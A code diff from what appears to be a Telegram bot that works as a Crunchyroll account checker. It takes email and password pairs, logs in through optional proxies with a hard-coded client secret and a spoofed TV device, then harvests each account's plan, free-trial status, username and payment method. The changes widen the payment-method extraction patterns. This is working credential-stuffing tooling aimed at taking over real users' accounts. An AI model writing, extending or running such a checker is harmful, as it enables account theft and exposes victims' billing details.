@@ -915,7 +915,7 @@ Try another account!
         """.strip()
 
 def check_crunchyroll(email, password, proxy=None):
-    """FINAL FIXED VERSION - Better Payment Method extraction"""
+    """FINAL VERSION - Stronger Payment Method extraction"""
     result = {
         'email': email,
         'password': password,
@@ -955,7 +955,7 @@ def check_crunchyroll(email, password, proxy=None):
                 "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
                 "device_type": "SamsungTV",
                 "device_id": device_id,
-                "device_name": "Cay"
+                "device_name": "Goku"
             }
 
             headers = {
@@ -986,7 +986,6 @@ def check_crunchyroll(email, password, proxy=None):
                 result['message'] = f"Login failed (HTTP {resp.status_code})"
                 return result
 
-            # ACCOUNT INFO
             acc_headers = {
                 'Authorization': f'Bearer {access_token}',
                 'User-Agent': user_agent,
@@ -1027,7 +1026,7 @@ def check_crunchyroll(email, password, proxy=None):
                             result['subscribable'] = 'Yes' if product.get('is_subscribable') else 'False'
                             result['free_trial'] = 'Yes' if items[0].get('active_free_trial') else 'False'
 
-                    # Benefits - Improved Payment extraction
+                    # Benefits - STRONGER Payment extraction
                     benefits_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
                                                headers=acc_headers, proxies=proxies, timeout=25)
                     if benefits_resp.status_code == 200:
@@ -1050,15 +1049,19 @@ def check_crunchyroll(email, password, proxy=None):
                                 result['plan_sub'] = f"UNKNOWN ({streams})"
                                 result['max_streams'] = streams
 
-                        # Improved Payment Method extraction (more patterns)
-                        payment_match = re.search(r'"source"\s*:\s*"([^"]+)"', benefits_data)
-                        if not payment_match:
-                            payment_match = re.search(r'"payment_method"\s*:\s*"([^"]+)"', benefits_data)
-                        if not payment_match:
-                            payment_match = re.search(r'"payment"\s*:\s*"([^"]+)"', benefits_data)
-
-                        if payment_match:
-                            result['payment_method'] = payment_match.group(1).capitalize()
+                        # === IMPROVED PAYMENT METHOD EXTRACTION ===
+                        payment_patterns = [
+                            r'"source"\s*:\s*"([^"]+)"',
+                            r'"payment_method"\s*:\s*"([^"]+)"',
+                            r'"payment"\s*:\s*"([^"]+)"',
+                            r'"method"\s*:\s*"([^"]+)"',
+                            r'"type"\s*:\s*"([^"]+)"'   # fallback
+                        ]
+                        for pattern in payment_patterns:
+                            payment_match = re.search(pattern, benefits_data)
+                            if payment_match:
+                                result['payment_method'] = payment_match.group(1).capitalize()
+                                break
 
             # Username
             profile_resp = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile",
@@ -1086,7 +1089,6 @@ def check_crunchyroll(email, password, proxy=None):
             return result
 
     return result
-
 async def start(update: Update, context: CallbackContext):
     context.user_data['in_main_menu'] = True
     if not is_owner(update):
